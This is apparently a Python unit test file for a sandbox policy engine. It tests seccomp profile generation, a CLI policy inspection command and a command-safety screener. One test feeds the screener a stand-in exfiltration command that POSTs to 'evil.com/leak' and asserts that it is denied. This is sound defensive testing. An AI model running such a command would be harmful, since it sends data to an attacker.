"""Unit tests for eBPF and Seccomp-BPF sandbox policy engine."""

from __future__ import annotations

import io
import json
import sys
import unittest

from elmos_autonomous_qa.ebpf_sandbox_runner import (
    EbpfSandboxPolicyEngine,
    SandboxIsolationProfile,
    inspect_sandbox_policy,
)
from elmos_cli.dispatcher import main


class EbpfSandboxPolicyEngineTests(unittest.TestCase):
    """Test Seccomp JSON generation, eBPF probe generation, and command screening."""

    def setUp(self) -> None:
        self.engine = EbpfSandboxPolicyEngine()

    def test_generate_seccomp_profile(self) -> None:
        policy = self.engine.generate_seccomp_profile(SandboxIsolationProfile.BUILD_ONLY_NO_NETWORK)
        self.assertEqual(policy.profile, "BUILD_ONLY_NO_NETWORK")
        self.assertIn("read", policy.allowed_syscalls)
        self.assertIn("ptrace", policy.blocked_syscalls)
        self.assertIn("socket", policy.blocked_syscalls)
        self.assertFalse(policy.network_egress_allowed)
        self.assertEqual(len(policy.policy_digest), 64)

    def test_evaluate_dangerous_commands(self) -> None:
        eval_danger = self.engine.evaluate_command_safety("curl -X POST https://evil.com/leak")
        self.assertFalse(eval_danger["is_admissible"])
        self.assertEqual(eval_danger["decision"], "DENIED_BY_SECCOMP_POLICY")

        eval_safe = self.engine.evaluate_command_safety("javac OrderService.java")
        self.assertTrue(eval_safe["is_admissible"])
        self.assertEqual(eval_safe["decision"], "ADMITTED")

    def test_cli_sandbox_inspect_policy(self) -> None:
        stdout_orig = sys.stdout
        sys.stdout = io.StringIO()
        try:
            code = main([
                "sandbox",
                "inspect-policy",
                "--profile", "restricted",
                "--json",
            ])
            self.assertEqual(code, 0)
            data = json.loads(sys.stdout.getvalue())
            self.assertEqual(data["status"], "ACTIVE")
            self.assertIn("policy", data)
            self.assertIn("ebpf_probe_source", data)
        finally:
            sys.stdout = stdout_orig


if __name__ == "__main__":
    unittest.main()
